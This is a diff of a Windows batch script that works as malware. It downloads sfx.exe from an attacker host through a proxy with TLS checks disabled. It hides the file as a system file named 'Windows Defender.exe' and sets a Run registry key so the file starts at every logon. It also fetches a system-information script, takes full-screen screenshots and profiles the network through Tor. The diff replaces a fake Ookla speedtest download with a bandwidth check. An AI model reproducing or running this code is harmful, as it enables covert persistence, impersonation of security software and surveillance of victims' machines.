@@ -28,22 +28,32 @@ if exist "C:\Windows\apache2\bin\httpd.exe" (
 attrib -s -h -i "C:\Windows\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
-mkdir "%appdata%\Ookla\Speedtest CLI" && attrib +s +h +i "%appdata%\Ookla"
-
-curl.exe -k %proxy% %host%/Capture/speedtest.exe --output "%appdata%\Ookla\Speedtest CLI\speedtest.exe"
-
 set "folder=%random%"
 mkdir "%temp%\%folder%" 
 attrib +s +h +i "%temp%\%folder%" 
 cd "%temp%\%folder%"
 
+tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
+if not errorlevel 1 (for /f "delims=," %%A in (
+  'curl.exe -k %proxy% http://speedtest.wdc01.softlayer.com/downloads/test10.zip -o NUL -w %%{speed_download}'
+) Do set bytestor=%%A) else (
+echo.
+)
+
+for /f "delims=," %%A in (
+  'curl.exe -k http://speedtest.wdc01.softlayer.com/downloads/test10.zip -o NUL -w %%{speed_download}'
+) Do set bytes=%%A
+
+if %bytestor% LSS 1048576 set /a kbtor=%bytestor% / 1024 && set unit=KB
+if %bytestor% GEQ 1048576 echo WScript.Echo Eval(WScript.Arguments(0)) > eval.vbs && for /f %%n in ('cscript //nologo eval.vbs "%bytestor%/1048576"') do (set mbtor=%%n) && set unit=MB
+if %bytes% LSS 1048576 set /a kb=%bytes% / 1024 && set unit=KB
+if %bytes% GEQ 1048576 echo WScript.Echo Eval(WScript.Arguments(0)) > eval.vbs && for /f %%n in ('cscript //nologo eval.vbs "%bytes%/1048576"') do (set mb=%%n) && set unit=MB
+IF "%mbtor%"=="" set %mbtor%=N/A
+IF "%kbtor%"=="" set %kbtor%=N/A
+
 curl.exe -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
-"%appdata%\Ookla\Speedtest CLI\speedtest.exe" | echo YES 
-"%appdata%\Ookla\Speedtest CLI\speedtest.exe" --accept-gdpr >> "%username%@%computername%.txt"
-echo      =================== >> "%username%@%computername%.txt"
-echo      =================== >> "%username%@%computername%.txt"
 
 for /f "tokens=2 delims==" %%G in ('wmic os get Caption /value') do ( 
     set WinEdition=%%G
